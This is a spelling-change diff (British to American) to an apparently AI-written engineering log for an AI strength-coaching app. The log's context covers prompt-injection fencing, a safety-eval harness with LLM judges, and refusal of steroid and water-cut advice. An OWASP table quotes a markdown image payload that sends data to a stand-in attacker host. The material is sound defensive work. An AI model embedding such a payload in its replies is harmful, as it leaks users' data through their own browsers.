@@ -157,7 +157,7 @@ Other decisions worth being able to defend:
 
 ---
 
-### 1.5 The Coach prompt — **DONE** (model behaviour unverified, see 1.7)
+### 1.5 The Coach prompt — **DONE** (model behavior unverified, see 1.7)
 
 `server/src/prompts/systemPrompt.js`. Static role definition, then live athlete
 state injected per request.
@@ -169,7 +169,7 @@ Three things are decided in code rather than left to the model:
    block forbidding any program — including a "modified" or "safe" one as a
    workaround. Asking the model to re-derive a safety condition from scattered
    fields every turn is strictly worse than computing it once and telling it
-   the answer. The gate also recognises "none", "n/a", "nope" as *not* a
+   the answer. The gate also recognizes "none", "n/a", "nope" as *not* a
    restriction, so a careful user is not locked out by their own thoroughness.
 2. **Prompt-injection fencing.** Profile free text is user-controlled. It is
    wrapped in `<user_data>` tags and the model is told explicitly that the
@@ -212,7 +212,7 @@ account and never written to logs or error reports.
 | `npm install` | ⛔ Blocked — see below |
 | `npm run build` | ⛔ Blocked |
 | Bundle secret scan | ⛔ Blocked (script written, needs a build to scan) |
-| Live Coach behaviour tests | ⛔ Blocked — needs your API key |
+| Live Coach behavior tests | ⛔ Blocked — needs your API key |
 | End-to-end signup → intake → program | ⛔ Blocked |
 
 **The blocker.** The build environment's network policy returns HTTP 403 for
@@ -294,7 +294,7 @@ the coupling in place — and left a test suite that only runs when production
 secrets are present.
 
 **Result.** 36 → **47 tests, passing with an entirely empty environment.** The
-eleven new ones cover the fail-fast behaviour itself, which had been the single
+eleven new ones cover the fail-fast behavior itself, which had been the single
 piece of the config layer that was *structurally impossible* to test: any test
 importing the function triggered the throw before it could assert on it.
 
@@ -448,7 +448,7 @@ then produced a competent twelve-week meet prep block.
 
 **Nothing harmful was emitted** — no compound names, no dosing — so the
 narrow assertion passed. But the safety boundary never engaged, because the
-question was never recognised. The athlete's actual question was silently
+question was never recognized. The athlete's actual question was silently
 ignored and answered as something else. That is its own failure mode: a user
 gets no answer, no refusal, and no signal that they were misunderstood.
 
@@ -457,7 +457,7 @@ shallower eval that only grepped the output for compound names would have
 marked this green.
 
 **Fix.** The prompt's PED clause was one line: "No performance-enhancing drug
-advice." It relied on the model recognising the topic unprompted, and lifters
+advice." It relied on the model recognizing the topic unprompted, and lifters
 do not use the phrase "performance-enhancing drug". The clause now names the
 vocabulary they actually use — `cycle`, `first cycle`, `run test`, `test only`,
 `stack`, `gear`, `blast and cruise`, `PCT`, and compound names — states
@@ -527,7 +527,7 @@ matched this:
 
 > "talk to a doctor … **not stop drinking water on your own**"
 
-**The grader matched the refusal and scored it as the offence.** A substring
+**The grader matched the refusal and scored it as the offense.** A substring
 search cannot distinguish "here is how to do X" from "do not do X".
 
 That is two wrong verdicts in two runs — one false negative (F.2), one false
@@ -543,7 +543,7 @@ useless on a safety check.
    containing a negation or refusal marker, and only then looks for the
    pattern. Naming a danger in order to decline it no longer counts as
    supplying it. Applied to the PED compound-name check as well — "I won't
-   advise you on trenbolone" is correct behaviour. Dosing patterns
+   advise you on trenbolone" is correct behavior. Dosing patterns
    (`500mg/week`) remain disqualifying in any context, since no refusal
    contains one.
 3. `suppliesFluidSchedule()` checks for what an actual protocol looks like —
@@ -576,7 +576,7 @@ Four runs of the harness produced this record:
 **Three wrong verdicts to one right one.** And run 3's clean sweep was not
 reassuring on inspection: the water-cut assertion passed only because that
 run's reply happened to say "stop drinking water **for** 5 days" and `for` was
-not in the pattern `stop drinking water (on|from|at)`. Same correct behaviour
+not in the pattern `stop drinking water (on|from|at)`. Same correct behavior
 as run 2, opposite verdict, decided by a preposition.
 
 A safety grader that is wrong three times in four gets ignored — and an
@@ -623,7 +623,7 @@ that fabricates a supporting quote is caught and its pass rejected. Tests
 wrong; it is more accurate than regexes at semantic questions, not infallible.
 What has actually improved is that failures are now visible and arguable —
 each verdict carries a quote and a reason — rather than silent and
-unexplainable. Judge-vs-human agreement has not been measured over a labelled
+unexplainable. Judge-vs-human agreement has not been measured over a labeled
 set, which is the next honest step if this ever gates a release.
 
 ### F.6 The judge's own first run found three defects — in the judge — **FIXED**
@@ -646,7 +646,7 @@ comparing raw strings was not. Coach writes markdown. The judge quoted
 `**please see a doctor or physical therapist**`. Correct verdict, rejected on
 formatting. **Five of the eight failures were this.**
 
-Normalisation now strips markdown emphasis, unifies smart punctuation, and
+Normalization now strips markdown emphasis, unifies smart punctuation, and
 collapses whitespace; elided quotes are checked fragment by fragment. The line
 drawn, and it needs stating because the tension is real: **ignore formatting,
 never ignore words.** Loosen further and the anchor stops catching invented
@@ -667,7 +667,7 @@ since they will not improve.
 [exact] regex assertions all passed, and where judged assertions did verify
 they were sharp:
 
-- The **PED scenario passed 3/3**, including the new "recognises this as a
+- The **PED scenario passed 3/3**, including the new "recognizes this as a
   question about anabolic steroids" criterion. Evidence:
   *"I don't advise on steroid use—cycles, compounds, stacking, that's outside
   what I do."* The F.1 fix is holding.
@@ -684,7 +684,7 @@ not.
 **The pattern worth noting across F.5 and F.6:** each evaluator generation
 found real problems, and each one's first run mostly found problems in
 *itself*. That is not an argument against evaluators — the coach's actual
-safety behaviour has been steady throughout, and the one genuine model failure
+safety behavior has been steady throughout, and the one genuine model failure
 (F.1) was caught by the crudest version of the harness. It is an argument for
 reading the output rather than the score.
 
@@ -710,7 +710,7 @@ Also strong this run: the prompt-injection scenario, where Coach volunteered
 > "I noticed a stray line in your equipment info that reads like an
 > instruction..."
 
-Naming the injected text rather than silently ignoring it is better behaviour
+Naming the injected text rather than silently ignoring it is better behavior
 than the assertion required.
 
 **6/8, and both failures were the grader again** — the third and last distinct
@@ -740,7 +740,7 @@ at most 20 words, no stitching.
 **Running total across seven runs: one real model failure (F.1, the PED miss),
 one real prompt bug (F.2), and six grader defects.** The pattern held to the
 end — every evaluator generation found real problems, and mostly found them in
-itself first. Coach's actual safety behaviour has been steady throughout, which
+itself first. Coach's actual safety behavior has been steady throughout, which
 is the reassuring half of that result.
 
 Tests 96 → **100**.
@@ -917,7 +917,7 @@ on it too**.
 
 RLS was still holding the line — no `UPDATE` policy exists, so the statement
 matched zero rows rather than rewriting history. But that is one layer of
-defence doing the work of two, and the failure was **silent**: an `UPDATE`
+defense doing the work of two, and the failure was **silent**: an `UPDATE`
 affecting zero rows returns success.
 
 Audit of the whole schema found `exercise_library` also carrying
@@ -1039,7 +1039,7 @@ conclusive — CSS carries no environment values, so it was unchanged.
 
 The `VITE_` variables were not set when Vercel built. Vite inlined `undefined`,
 `supabase.js` threw at module load, React never mounted, and the body stayed
-empty — black, because that is the CSS background colour.
+empty — black, because that is the CSS background color.
 
 **The configuration mistake was the operator's. The blank page was the code's.**
 
@@ -1307,8 +1307,8 @@ Details worth keeping:
   set, and refusing to transmit it does not make it stronger. Supabase reports
   a weak existing password at sign-in as its own error, which is where a prompt
   to change it belongs.
-- **State is carried three ways** — glyph, colour, and text hidden visually but
-  present in the accessibility tree. Colour alone excludes people, and a tick
+- **State is carried three ways** — glyph, color, and text hidden visually but
+  present in the accessibility tree. Color alone excludes people, and a tick
   glyph is invisible to a screen reader.
 - **Rule ids are i18n keys**, and a test asserts every id has a non-empty label
   in every locale. Adding a rule without translating it fails the suite instead
@@ -1353,7 +1353,7 @@ never once succeeded for anybody — the `conversations` table held zero rows.
 **The route was right and the schema was wrong.** ADR-2's premise is that
 application code never names a user id: RLS scopes reads, so no query filters
 by `user_id` and none needs to. The chat route's own comment says so. Reads
-honoured it. Writes silently did not, and five of the six insert call sites
+honored it. Writes silently did not, and five of the six insert call sites
 papered over the gap by passing `user_id` explicitly. The one that followed the
 documented design was the one that broke.
 
@@ -1508,7 +1508,7 @@ untrue:**
 | Property | Why it matters |
 |---|---|
 | No `tools:` in the Anthropic call | Excessive Agency, OWASP #3 and the biggest climber. The coach emits text and nothing else. |
-| No credential pattern in the assembled prompt | OWASP #8 advises assuming the context is discoverable. The defence is that nothing in it is a secret. |
+| No credential pattern in the assembled prompt | OWASP #8 advises assuming the context is discoverable. The defense is that nothing in it is a secret. |
 | Replies render as `{message.content}`, no markdown dependency | Improper Output Handling. A markdown renderer turns an injected `![](https://attacker/?d=…)` into an exfiltration channel — the victim's own browser makes the request. |
 
 **20 unit tests**, plus three live adversarial scenarios in `safety-eval.mjs`:
@@ -1558,8 +1558,8 @@ athlete who later reads the research has been handed a reason to distrust
 everything else the coach said. Accuracy here is a trust decision, not a
 pedantic one.
 
-**The behavioural rules matter as much as the facts.** Raise a factor once,
-tied to something concrete, then let it go. Never moralise. **Never make
+**The behavioral rules matter as much as the facts.** Raise a factor once,
+tied to something concrete, then let it go. Never moralize. **Never make
 coaching conditional on a lifestyle change** — that is coercive and not the
 coach's to do. If someone says they are not changing something, program for the
 recovery capacity they actually have.
@@ -1583,7 +1583,7 @@ is what makes "mention it once" a followable instruction rather than a hope.
 Thresholds are conversation prompts, never conclusions: seven hours is not a
 diagnosis.
 
-**21 unit tests** plus three live scenarios (accurate-not-moralising on alcohol,
+**21 unit tests** plus three live scenarios (accurate-not-moralizing on alcohol,
 a disclosed dependence, and disordered-eating signals).
 
 Tests 128 → **186**. Migrations 0011 → **0012**.
@@ -1822,7 +1822,7 @@ California is not filed as tomorrow.
 
 Logic lives in `web/src/lib/sessionDraft.js` as pure functions, the same pattern
 as the consent gate, the password policy and the age gate — the interesting
-behaviour is all edge cases, and edge cases are miserable to verify by clicking.
+behavior is all edge cases, and edge cases are miserable to verify by clicking.
 
 Tests 207 → **223**.
 
@@ -1846,7 +1846,7 @@ handler, where every route that validates a body inherits it.
 
 Worth recording plainly: with no instrument available I spent several steps
 reasoning about the client code trying to deduce which field zod had rejected —
-the precise behaviour D.14 was written about. The user found it in one attempt
+the precise behavior D.14 was written about. The user found it in one attempt
 by typing something short.
 
 **The fix, in three parts, because the cap was never the whole problem:**
@@ -2037,7 +2037,7 @@ Tests 266 → **294**.
 ### D.20 The exercise library was empty, and the coach knew it — **DONE**
 
 `exercise_library` has existed since migration 0001 and held zero rows the
-whole time. The consequence was not a blank page somewhere; it was a behaviour.
+whole time. The consequence was not a blank page somewhere; it was a behavior.
 `systemPrompt.js` says that when the library is empty the coach must not link,
 name or describe **any** demonstration video — a deliberate guard against
 hallucinated URLs — so every athlete who asked how to squat was told video
@@ -2096,15 +2096,15 @@ along the bottom. The alternative, a second y-axis, is the single most
 misleading thing a chart can do: where the two lines cross is an artefact of
 where you put the axes, not a fact about the training.
 
-**The colours were computed, not chosen.** The obvious pairing — the app's
-accent red for the line, green for a good set — fails colour-vision separation
+**The colors were computed, not chosen.** The obvious pairing — the app's
+accent red for the line, green for a good set — fails color-vision separation
 at ΔE 2.7 under deuteranopia, the most common form. That is the classic
-red/green trap and it is invisible to anyone with normal colour vision, which
+red/green trap and it is invisible to anyone with normal color vision, which
 is why it gets shipped. Blue and amber clear it at ΔE 32 on the dark surface
 and 27 on the light, each stepped into that surface's own lightness band, so
 dark mode carries its own values rather than an automatic flip. A missed set
 also differs by **shape** — hollow ring, not filled dot — with a written key,
-because colour alone must never carry the one distinction that changes what the
+because color alone must never carry the one distinction that changes what the
 chart means.
 
 **Three defects found while building it.**
@@ -2129,7 +2129,7 @@ and is tested from two timezones on opposite sides of the line.
 geometry functions were used to emit a standalone SVG of both themes and
 screenshot it with headless Chromium. That is what surfaced the last defect:
 26 px of bottom padding was reserved for an x-axis and nothing was drawing one,
-so the static charts had no time reference at all. Only the ends are labelled —
+so the static charts had no time reference at all. Only the ends are labeled —
 a date under every point is unreadable at 340 px wide.
 
 The table view is not a fallback for when the charts fail. It is the same
@@ -2176,7 +2176,7 @@ into one animation frame rather than run on every event.
 **A palette, and the claim in it that was wrong.** Deep indigo night, hot
 magenta, cyan-teal.
 
-*On trademark:* a colour, or a pairing of colours, can be protected only by
+*On trademark:* a color, or a pairing of colors, can be protected only by
 acquiring secondary meaning within a product category — John Deere's green and
 yellow, for farm equipment — and that protection does not reach across
 industries. Nobody owns teal-and-magenta for strength software. What **is**
@@ -2185,25 +2185,25 @@ it appears nowhere in the product: not in a class, not in a comment, not in the
 UI. A test asserts its absence, because that is the kind of thing that gets
 typed into a CSS comment by accident.
 
-*On memorability versus readability:* colour does measurably affect cognition.
+*On memorability versus readability:* color does measurably affect cognition.
 Mehta & Zhu (Science, 2009) found red improved performance on detail-oriented
 tasks — memory retrieval and proofreading — by up to 31% against blue, while
 blue roughly doubled creative output. A coach whose job is recalling cues and
-numbers wants the warm end, which is why the primary action colour is magenta
+numbers wants the warm end, which is why the primary action color is magenta
 and not the cyan. But that effect is small next to simply being able to read
 the screen.
 
-*So the colours were computed.* `server/test/palette.test.js` calculates every
+*So the colors were computed.* `server/test/palette.test.js` calculates every
 contrast ratio from the stylesheet rather than trusting a comment — and that is
 how the one defect here was caught. A comment I had just written asserted a
-link colour reached 4.98:1. The function said **3.48:1**, below the 4.5
+link color reached 4.98:1. The function said **3.48:1**, below the 4.5
 required for body text. `--link` is now a separate token from `--secondary`,
 and the distinction is worth keeping: text must clear 4.5:1 while a chart mark
-or a border only needs 3:1. The same colour can be fine as one and unusable as
+or a border only needs 3:1. The same color can be fine as one and unusable as
 the other.
 
 Two test defects found alongside. The library test asserted `target="_blank"` —
-it encoded the behaviour being removed — and once rewritten, matched the
+it encoded the behavior being removed — and once rewritten, matched the
 *comment explaining the removal*, the same trap the stretching assertion hit.
 Comments are now stripped before matching. And the palette test's own helper
 split the stylesheet at the first light media query, which put the chart tokens
@@ -2274,7 +2274,7 @@ it fixed something now says what actually happened.
 
 The `min-width: 0` rules stay, because the destinations row genuinely does
 scroll: scrollWidth 499 against clientWidth 358 at that column, which is the
-intended behaviour and those rules are what permit it.
+intended behavior and those rules are what permit it.
 
 Two tests moved rather than being deleted: they asserted that `Chat.jsx`
 contained links to `/log` and `/library`, which now live in the shared nav. The
@@ -2297,18 +2297,18 @@ Over both sits a very soft two-wash field: teal from the top left, magenta from
 the bottom right, meeting neutral in the middle. A field rather than a picture —
 no edges, no shapes, nothing that moves, nothing for the eye to catch on.
 
-**Measured, not admired.** A gradient has no single colour, so the only honest
+**Measured, not admired.** A gradient has no single color, so the only honest
 check is text contrast at the *extreme* of each wash, where the background is
 furthest from base. Worst case anywhere in the scheme: secondary text over the
 magenta wash in light mode at 5.74:1, against 4.5:1 required.
 
 **Two implementation details that are the whole difference between this looking
 designed and looking broken.** It is painted on a fixed pseudo-element rather
-than with `background-attachment: fixed`, which iOS Safari does not honour and
-which repaints on every scroll frame elsewhere; the base colour moves to `html`
+than with `background-attachment: fixed`, which iOS Safari does not honor and
+which repaints on every scroll frame elsewhere; the base color moves to `html`
 so that layer has something to sit above. And each wash fades to an alpha-zero
 version of **its own hue**, never to the `transparent` keyword — `transparent`
-is transparent *black*, so a gradient running to it interpolates through grey
+is transparent *black*, so a gradient running to it interpolates through gray
 and leaves a dirty band with a hard edge. That band duly appeared in the bottom
 right corner the first time it was rendered, which is the argument for
 rendering things and looking at them.
@@ -2347,7 +2347,7 @@ the mark five times quickly opens a versus splash: you against the bar, which
 has no strategy and will weigh the same tomorrow.
 
 **An easter egg that fires by accident is not a joke, it is a bug with a sense
-of humour.** Four rules, each with a test.
+of humor.** Four rules, each with a test.
 
 *Never while typing.* The sequence is mostly arrow keys, and the coach page is
 a textarea people write paragraphs in — arrows are how you edit a sentence.
@@ -2358,14 +2358,14 @@ needs five taps inside one second and resets its window rather than
 accumulating stray clicks over a session.
 
 *Nothing navigates itself.* The outbound link is a button the athlete presses,
-labelled with where it goes. It opens a new tab **on purpose**, which is the
+labeled with where it goes. It opens a new tab **on purpose**, which is the
 opposite of the decision taken for the exercise library in D.22 — and the
 difference is who asked. A demonstration video is content the athlete went
 looking for and expects to return from, so it stays in the tab and keeps the
 back button meaningful. This is a detour they chose from inside a joke; losing
 their place would be the actual annoyance.
 
-*Reduced motion is honoured.* Somebody who asked their operating system to stop
+*Reduced motion is honored.* Somebody who asked their operating system to stop
 animating things has opted out of movement, not out of jokes. The panel still
 appears; it simply does not bounce. It is a real dialog besides — Escape closes
 it, the backdrop closes it, and focus lands on the dismiss button.
@@ -2427,7 +2427,7 @@ response is identical, the thing rejecting you is not the thing you are trying
 to authenticate to.
 
 **Getting there also turned up two genuine traps**, both now in the skill.
-Node's `fetch` ignores `HTTPS_PROXY` — curl honours it, undici does not — so
+Node's `fetch` ignores `HTTPS_PROXY` — curl honors it, undici does not — so
 the first symptom was `EAI_AGAIN` while curl worked from the same shell; fixed
 with `NODE_USE_ENV_PROXY=1`. Then a TLS-intercepting proxy produced
 `SELF_SIGNED_CERT_IN_CHAIN`, because its CA is in the system store and not in
@@ -2439,7 +2439,7 @@ connection with verification switched off.
 changes — "exits non-zero if any scenario fails, so it can gate a prompt change
 in CI" — and was then wired to nothing, so it ran only when somebody
 remembered. In that window four significant changes went into the system
-prompt, every one verified against files rather than against model behaviour.
+prompt, every one verified against files rather than against model behavior.
 `.github/workflows/safety-eval.yml` now runs the 14 scenarios on any change to
 the prompt, the progression engine or the warm-up engine, weekly on a schedule
 because the model changes even when the prompt does not, and on demand. The key
